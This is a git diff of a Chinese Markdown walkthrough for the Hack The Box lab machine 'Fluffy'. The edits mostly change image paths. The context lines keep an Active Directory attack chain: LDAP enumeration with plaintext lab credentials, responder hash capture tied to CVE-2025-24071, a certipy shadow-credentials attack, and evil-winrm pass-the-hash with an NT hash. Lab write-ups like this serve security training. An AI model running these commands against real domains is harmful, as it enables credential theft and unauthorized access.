@@ -25,7 +25,7 @@ gogo -i 10.10.11.69 -p win,top2,db -f htb1.dat
 gogo.exe -F htb1.dat
 ```
 
-![image-20250824134959501](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250824134959501.png)
+![image-20250824134959501](assets/Fluffy/image-20250824134959501.png)
 
 开放端口可利用协议：
 
@@ -170,7 +170,7 @@ gpt分析：
 
 
 
-![image-20250824135822093](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250824135822093.png)
+![image-20250824135822093](assets/Fluffy/image-20250824135822093.png)
 
 ai:
 
@@ -280,7 +280,7 @@ Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:Tr
 
 
 
-![image-20250824140554051](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250824140554051.png)
+![image-20250824140554051](assets/Fluffy/image-20250824140554051.png)
 
 ```powershell
  .\nxc.exe ldap 10.10.11.69 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --groups
@@ -531,7 +531,7 @@ LDAP 10.10.11.69 389 DC01
 .\nxc.exe ldap 10.10.11.69 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --users
 ```
 
-![image-20250824141104035](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250824141104035.png)
+![image-20250824141104035](assets/Fluffy/image-20250824141104035.png)
 
 初始用户权限是普通用户，没有管理员权限。
 
@@ -569,7 +569,7 @@ j.fleischman
 
 将这个`pdf`文件下载下来
 
-![image-20250529153843252](https://www.hyhforever.top/posts/2025/05/htb-fluffy/images/image-20250529153843252.png)
+![image-20250529153843252](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0d6d9c2d1a8f33b01ad075994a3af657.png)
 
 ### CVE-2025-24071 
 
@@ -604,7 +604,7 @@ responder -I tun0 -wvF
 
 
 
-![image-20250824200715688](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250824200715688.png)
+![image-20250824200715688](assets/Fluffy/image-20250824200715688.png)
 
 ##### 得到账号密码
 
@@ -634,7 +634,7 @@ neo4j.bat console
 #进入之后默认账密neo4j：neo4j，进入之后会让强制修改密码。修改之后，在日志里查看web页面路径，进入之后复制bloodhound可以使用的路径，然后用账密登录即可。将zip导入
 ```
 
-![image-20250825143550502](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250825143550502.png)
+![image-20250825143550502](assets/Fluffy/image-20250825143550502.png)
 
 ### acl提权
 
@@ -662,7 +662,7 @@ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'wi
 33bd09dcd697600edf6b3a7af4875767
 ```
 
-![image-20250825154906764](D:\Obsidian\1Test\htb\assets\Fluffy\image-20250825154906764.png)
+![image-20250825154906764](assets/Fluffy/image-20250825154906764.png)
 
 ```bash
 evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
